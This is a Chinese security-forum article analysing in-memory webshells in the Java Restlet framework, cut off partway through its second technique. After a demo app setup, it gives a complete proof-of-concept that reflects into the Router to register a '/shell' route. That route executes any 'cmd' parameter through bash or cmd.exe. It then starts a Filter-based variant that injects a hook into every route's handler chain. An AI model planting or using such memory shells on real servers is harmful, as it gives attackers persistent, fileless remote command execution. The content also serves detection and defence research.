---
title: Restlet 框架内存马分析
url: https://forum.butian.net/share/3765
source: 奇安信攻防社区
date: 2024-09-26
fetch_date: 2025-10-06T18:20:00.240010
---

# Restlet 框架内存马分析

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Restlet 框架内存马分析

* [漏洞分析](https://forum.butian.net/topic/48)

Restlet 是一个开源的 Java 框架（https://restlet.talend.com/），专为创建 RESTful Web 服务和应用而设计。它提供了一种简单而灵活的方式来构建基于 REST 的应用程序，适合构建微服务、Web API 和移动后端。简单来说，Restlet就是一个用来搭建API服务的框架

前言
--
Restlet 是一个开源的 Java 框架（<https://restlet.talend.com/>），专为创建 RESTful Web 服务和应用而设计。它提供了一种简单而灵活的方式来构建基于 REST 的应用程序，适合构建微服务、Web API 和移动后端。简单来说，Restlet就是一个用来搭建API服务的框架
环境搭建
----
在pom.xml中导入依赖
```xml
<dependencies>
<dependency>
<groupId>org.restlet.jse</groupId>
<artifactId>org.restlet</artifactId>
<version>2.3.12</version>
</dependency>
</dependencies>
```
`Main.java`
```java
import org.restlet.Component;
import org.restlet.data.Protocol;
public class Main {
public static void main(String[] args) throws Exception {
// 创建一个组件
Component component = new Component();
component.getServers().add(Protocol.HTTP, 8080);
// 将应用附加到组件
component.getDefaultHost().attach(new MyApplication());
// 启动组件
component.start();
}
}
```
`MyCustomFilter.java`
```java
import org.restlet.Request;
import org.restlet.Response;
import org.restlet.routing.Filter;
public class MyCustomFilter extends Filter {
@Override
protected int beforeHandle(Request request, Response response) {
// 在请求处理之前执行逻辑
System.out.println("Before handling request: " + request.getResourceRef());
return CONTINUE; // 继续处理请求
}
@Override
protected void afterHandle(Request request, Response response) {
// 在请求处理之后执行逻辑
System.out.println("After handling request: " + request.getResourceRef());
}
}
```
`MyResource.java`
```java
import org.restlet.resource.Get;
import org.restlet.resource.ServerResource;
public class MyResource extends ServerResource {
@Get
public String represent() {
return "Hello, World!";
}
}
```
`MyApplication.java`
```java
import org.restlet.Application;
import org.restlet.Restlet;
import org.restlet.routing.Router;
public class MyApplication extends Application {
@Override
public Restlet createInboundRoot() {
Router router = new Router(getContext());
// 创建过滤器实例
MyCustomFilter myFilter = new MyCustomFilter();
// 将过滤器应用到资源
myFilter.setNext(MyResource.class); // 设置过滤器的下一个处理器为资源
// 将过滤器添加到路由
router.attach("/hello", myFilter);
return router;
}
}
```
只需要四个文件就可以启动一个简易的Restlet 项目，运行Main.java，访问[127.0.0.1:8080/hello](http://127.0.0.1:8080/hello) 正常说明搭建成功
![image-20240831160302706.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-0e6740482a413b92b0e2be80ffbc4fdf4a052360.png)
基本上，一个使用Restlet 框架构建的RESTful应用程序的大部分都需要使用两个基类：`Application`和`Resource`
- Application实例用于将URI映射到Resource实例上
- Resource实例用于处理实际的业务逻辑
进入到MyApplication.java中可以看到具体实现过程，实际上资源是以处理器链的形式存在的，首先会经过配置的过滤器最后才到达资源处理器，这种灵活性使得用户能够根据具体的请求路径配置不同的处理逻辑
![image-20240830154232350.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-9884b7f4f2f344de1e00e6f0a9bf0b7162fcebef.png)
Router内存马
---------
首先修改一下MyResource类，当访问到/hello接口时就会调用到MemoryApplication类来注入内存马
![image-20240830155435329.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-7452dcb982325cbb9a16476fb8bfe0fa1fc02ecf.png)
Router内存马就类似于Spring下的Controller类型的内存马，主要通过Router.attach()来实现添加一个URI映射到资源
关键是需要获取到环境上下文（Context）中router对象，再通过该对象来显式添加一个URI映射。通过官方文档知道使用`Context ctx = Context.getCurrent()`可以获取到当前上下文实例
下断点调试程序，通过getCurrent()得到上下文实例，最终发现所需要的Router对象保存在inboundRoot属性中
![image-20240831111559445.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-363de66d6859548ae9dc512217e76e6768efcc0f.png)
利用反射获取到Router对象
```java
Context ctx = Context.getCurrent();
Object obj = ctx.getClientDispatcher();
Field field = obj.getClass().getDeclaredField("childContext");
field.setAccessible(true);
obj = field.get(obj);
field = obj.getClass().getDeclaredField("child");
field.setAccessible(true);
obj = field.get(obj);
field = obj.getClass().getSuperclass().getDeclaredField("inboundRoot");
field.setAccessible(true);
obj = field.get(obj);
```
![image-20240831112102972.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-8b694447f9d900d215d01522b9c2908ff0a4179d.png)
得到Router对象之后，调用该对象里的attach()方法添加一个URI映射即可
```java
// 完整POC
import org.restlet.Application;
import org.restlet.Context;
import org.restlet.Request;
import org.restlet.resource.Get;
import org.restlet.resource.ServerResource;
import org.restlet.routing.Router;
import java.lang.reflect.Field;
public class MemoryApplication extends Application {
static {
try {
Context ctx = Context.getCurrent();
Object obj = ctx.getClientDispatcher();
Field field = obj.getClass().getDeclaredField("childContext");
field.setAccessible(true);
obj = field.get(obj);
field = obj.getClass().getDeclaredField("child");
field.setAccessible(true);
obj = field.get(obj);
field = obj.getClass().getSuperclass().getDeclaredField("inboundRoot");
field.setAccessible(true);
obj = field.get(obj);
Router router = (Router) obj;
router.attach("/shell", MemoryShell.class);
} catch (Exception e) {
e.printStackTrace();
}
}
public static class MemoryShell extends ServerResource{
@Get
public String represent() {
Request request = getRequest();
String param1 = (String) request.getResourceRef().getQueryAsForm().getFirstValue("cmd");
try{
String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
? new String[]{"cmd.exe", "/c", param1}
: new String[]{"/bin/bash", "-c", param1};
String output = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next();
return output;
} catch (Exception e){
return e.toString();
}
}
}
}
```
接着访问/hello接口来注入内存马，可以通过查询Router对象下routes属性来查看路由列表，可以看到已经成功注入
![image-20240831112652835.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-3a9241abb5f4134c6eafcc7caaae856ed8712a0c.png)
当访问到/shell接口时就会调用到MemoryShell类下的方法执行命令
![image-20240831112939794.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-502f2c8e3eee0957a07ec7a7e06f7395a8c471cd.png)
Filter内存马
---------
Filter的内存马构造相对来说会复杂一点，因为在Restlet 中不存在默认的全局过滤器，开发者必须显式添加自定义的过滤器
在测试环境中，设置了/hello接口的过滤器为MyCustomFilter，在该过滤器类的beforeHandle方法下断点，当请求到达资源类前会先经过该方法，通过查看调用栈可以知道前面并没有经过其他的过滤器
![image-20240831121510904.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-6d2a4c92259fbaf1899e783dd5a401c19a3c4524.png)
当请求到达服务端时，程序会匹配routes下的路由规则，获取到next属性的对象，该对象即为下一个处理器
```java
//当前处理器链
/hello -> MyCustomFilter -> MyResource.class
```
![image-20240831122042611.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-d02612593281625c83ce73975ae85f11e7635a5a.png)
所以如果需要添加Filter内存马的话，需要自行修改TemplateRoute对象的next属性，相当于在处理器链开头新插入一个元素
```java
/hello -> MemortShellFilter -> MyCustomFilter -> MyResource.clas
```
通过下面的反射代码获取路由节点中next属性的内容，得到的obj就是原有的处理器链
```java
Context ctx = Context.getCurrent();
Object obj = ctx.getClientDispatcher();
Field field = obj.getClass().getDeclaredField("childContext");
field.setAccessible(true);
obj = field.get(obj);
field = obj.getClass().getDeclaredField("child");
field.setAccessible(true);
obj = field.get(obj);
field = obj.getClass().getSuperclass().getDeclaredField("inboundRoot");
field.setAccessible(true);
obj = field.get(obj);
field = obj.getClass().getDeclaredField("routes");
field.setAccessible(true);
obj = field.get(obj);
// 这里的for循环是遍历routes列表下的所有路由，即为所有路由的处理链都添加一个新的过滤器
// 也可以根据自己的需要单独为某个路由添加
for (Object route: (RouteList) obj) {
field = route.getClass().getSuperclass().getSuperclass().getDeclaredField("next");
field.setAcce...